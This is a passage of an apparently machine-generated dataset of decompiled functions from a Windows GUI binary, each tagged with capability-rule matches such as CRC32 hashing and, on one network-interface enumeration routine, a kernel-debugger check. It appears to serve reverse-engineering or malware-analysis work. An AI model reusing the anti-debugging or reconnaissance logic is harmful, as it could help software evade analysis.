arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x4621e7\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.0046c474(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x4622af\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1926
    },
    "00462eb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462eb8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x462fd6;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403ae4();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.00462e50();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.00466ca8();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4a87f8;\n    fcn.00404520();\n    fcn.004056d0();\n    fcn.0040a824();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x462fdd;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 655
    },
    "00464b80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464b80(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uVar3;\n    uint uStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint var_50h;\n    int32_t nXDest;\n    int32_t nHeight;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_10h;\n    uint hgdiobj;\n    uint hdc;\n    int32_t *var_4h;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        puStack96 = 0x464bd7;\n        cVar1 = fcn.004501e8();\n        if (cVar1 == '\\0') {\n            puStack96 = &fcn.00464b80::var_50h;\n            uStack100 = 0x464c99;\n            uStack100 = fcn.00466ca8();\n            puStack104 = 0x464c9f;\n            uVar3 = sub.user32.dll_BeginPaint();\n            puStack104 = var_3ch - nHeight;\n            iStack108 = var_40h - nXDest;\n            uStack112 = uVar3;\n            hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n            *in_FS_OFFSET = &stack0xffffff84;\n            uStack132 = 0x464ccc;\n            uStack136 = sub.gdi32.dll_CreateCompatibleDC();\n            uStack132 = hgdiobj;\n            puStack140 = 0x464cdc;\n            hdc = uStack136;\n            var_10h = sub.gdi32.dll_SelectObject();\n            uStack144 = 0x464d69;\n            uStack148 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff6c;\n            puStack140 = &stack0xfffffffc;\n            sub.gdi32.dll_SetWindowOrgEx(hdc, nXDest, nHeight, 0);\n            fcn.004601fc(hdc);\n            *(param_2 + 4) = hdc;\n            fcn.00464b80();\n            *(param_2 + 4) = 0;\n            sub.gdi32.dll_BitBlt\n                      (uVar3, nXDest, nHeight, var_40h - nXDest, var_3ch - nHeight, hdc, nXDest, nHeight, 0xcc0020);\n            *in_FS_OFFSET = uVar3;\n            sub.gdi32.dll_SelectObject(hdc, var_10h, 0x464d70);\n            return;\n        }\n        puStack96 = &fcn.00464b80::var_50h;\n        uStack100 = 0x464beb;\n        uStack100 = fcn.00466ca8();\n        puStack104 = 0x464bf1;\n        sub.user32.dll_BeginPaint();\n        iStack108 = 0x464c86;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        fcn.0044f5ac(&fcn.00464b80::hdc, 0);\n        fcn.004601fc(hdc);\n        uVar3 = 4;\n        uStack132 = 0x464c3e;\n        fcn.004601fc(4);\n        uStack132 = 0x464c4c;\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uStack132 = 0x464c5c;\n            fcn.0044f6a4();\n        }\n        uStack132 = 0x464c66;\n        fcn.0044f638();\n        *in_FS_OFFSET = uVar3;\n        fcn.00466ca8();\n        uStack132 = 0x464c85;\n        sub.user32.dll_EndPaint();\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        puStack96 = 0x464bb0;\n        var_4h = in_EAX;\n        iVar2 = fcn.00462d98();\n        if (iVar2 == 0) {\n            puStack96 = 0x464bbe;\n            (**(*var_4h + -0x10))();\n            return;\n        }\n    }\n    puStack96 = 0x464bcd;\n    fcn.00464400();\n    return;\n}\n",
        "token_count": 1077
    },
    "004650a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004650a4(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x4650f4 == (*0x4650f0 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.00460c40();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 186
    },
    "004650f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004650f8(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00466fc0();\n    fcn.00461adc();\n    (**(*in_EAX + -0x10))();\n    fcn.004628dc();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "00465ccc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00465ccc(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00462d98(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00462d5c();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.004601fc(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004047cc(),  cVar1 != '\\0' && (cVar1 = fcn.00465ccc(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "00467a6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467a6c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    (**(*in_EAX + -0x10))();\n    piVar1 = *(param_2 + 8);\n    sub.user32.dll_InflateRect(piVar1, -in_EAX[0x67], -in_EAX[0x67]);\n    if (*(in_EAX + 0x195) != '\\0') {\n        iVar2 = 0;\n        if (*(in_EAX + 0x193) != '\\0') {\n            iVar2 = in_EAX[0x66];\n        }\n        if (*(in_EAX + 0x65) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x66];\n        }\n        if ((*(in_EAX + 0x192) & 1) != 0) {\n            *piVar1 = *piVar1 + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 2) != 0) {\n            piVar1[1] = piVar1[1] + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 4) != 0) {\n            piVar1[2] = piVar1[2] - iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 8) != 0) {\n            piVar1[3] = piVar1[3] - iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00467afc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467afc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x467dc1;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x467dc9;\n        cVar3 = fcn.004528ac();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x467ddb;\n            fcn.00452050();\n            uStack80 = 0x467de5;\n            fcn.00452724();\n        }\n        return;\n    }\n    uStack80 = 0x467b2f;\n    uStack80 = fcn.00466ca8();\n    puStack84 = 0x467b35;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x467daf;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.00466ca8(&fcn.00467afc::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.00466ca8(&fcn.00467afc::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.00466ca8(&fcn.00467afc::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.00467afc::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.00467afc::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.00466ca8(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x4a4d4c)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x4a4d4c)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.00467afc::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x4a485c) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x4a486c), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x4a487c) | *(*(var_4h + 0x1d9) * 4 + 0x4a488c) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.00467afc::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.00467afc::nLeftRect);\n        uVar4 = fcn.00466ca8(&fcn.00467afc::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.00467afc::lprcSrc1, &fcn.00467afc::lprcSrc1, &fcn.00467afc::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.00467afc::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00428438();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.00467afc::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.00466ca8(hDC, 0x467db6);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1623
    },
    "00467eb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467eb0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x467f36;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x467ee0;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x467f19;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.00464400();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x467f36;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x467f2a;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "004717d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.004717d0(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x471824;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x471824 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 249
    },
    "00472ad8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472ad8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.004721f4();\n        fcn.004721f4();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.00472344();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.00472344();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 341
    },
    "00473fe4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473fe4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.004759cc();\n        }\n        fcn.0045ee64();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "004766a8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004766a8(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x476758;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x00476742;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x0047671b;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x004766fa:\n        puStack24 = puVar1;\n        fcn.00407480();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.00471924();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x004766fa;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.0040483c();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x004766fa;\n        }\n    }\ncode_r0x0047671b:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.00476a7c();\n        }\n        fcn.0040483c();\n    }\ncode_r0x00476742:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x47675f;\n    uStack28 = 0x476757;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 562
    },
    "00477134": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00477134(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.00466ca8(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00479188": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00479188(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0045e5d4();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.004757b8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "004791c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004791c4(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0045e608();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.004757b8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "0047926c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004792b5)\n// WARNING: Removing unreachable block (ram,0x004792d5)\n// WARNING: Removing unreachable block (ram,0x004792de)\n// WARNING: Removing unreachable block (ram,0x004792e3)\n// WARNING: Removing unreachable block (ram,0x004792f0)\n// WARNING: Removing unreachable block (ram,0x004792f5)\n// WARNING: Removing unreachable block (ram,0x00479302)\n\nvoid fcn.0047926c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47934c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.0046565c();\n    if (iVar1 == 1) {\n        fcn.0045eeb4();\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.0045eec4();\n        fcn.0045ef74();\n    }\n    fcn.004654c0();\n    fcn.0045e2c8();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.00473fe4();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x479353;\n    uStack32 = 0x47934b;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 397
    },
    "0047970c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0047970c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x4a4d20)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 111
    },
    "0047fc68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0047fc68(void)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff94c;\n    int32_t iStack1688;\n    uint uStack1684;\n    uchar *puStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    int32_t iStack1664;\n    uint uStack1660;\n    uchar *puStack1656;\n    uint var_664h;\n    uint var_660h;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    uint in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1656 = &stack0xfffffffc;\n    uStack1660 = 0x47fee8;\n    iStack1664 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff980;\n    uStack1668 = 0x47fca1;\n    fcn.0040546c();\n    uStack1668 = 0;\n    uStack1672 = 1;\n    uStack1676 = 2;\n    puStack1680 = 0x47fcac;\n    iVar2 = sub.wsock32.dll_socket();\n    s = iVar2;\n    if (iVar2 != -1) {\n        uStack1684 = 0x47feb5;\n        iStack1688 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff968;\n        puStack1680 = &stack0xfffffffc;\n        iVar3 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar2, 0x4004747f, 0, 0, &fcn.0047fc68::var_658h, 0x400, &fcn.0047fc68::var_8h, 0, 0);\n        if ((iVar3 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar4 = &fcn.0047fc68::var_654h;\n            do {\n                var_1ch = *puVar4;\n                in = puVar4[1];\n                uStack24 = puVar4[2];\n                uStack20 = puVar4[3];\n                sub.wsock32.dll_inet_ntoa(puVar4[1]);\n                fcn.00405664(0x47ff00, *in_EAX);\n                fcn.00405800(0x47ff10, 0);\n                var_1ch = puVar4[0xc];\n                in = puVar4[0xd];\n                uStack24 = puVar4[0xe];\n                uStack20 = puVar4[0xf];\n                sub.wsock32.dll_inet_ntoa(puVar4[0xd]);\n                fcn.00405664(0x47ff1c, *in_EAX);\n                fcn.00405800(0x47ff10, 0);\n                var_1ch = puVar4[6];\n                in = puVar4[7];\n                uStack24 = puVar4[8];\n                uStack20 = puVar4[9];\n                sub.wsock32.dll_inet_ntoa(puVar4[7]);\n                fcn.00405664(0x47ff30, *in_EAX);\n                fcn.00405800(0x47ff10, 0);\n                uVar1 = puVar4[-1];\n                if ((uVar1 & 1) == 1) {\n                    fcn.00405800(0x47ff10, 0x47ff50, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x47ff10, 0x47ff68, *in_EAX);\n                }\n                if ((uVar1 & 2) == 2) {\n                    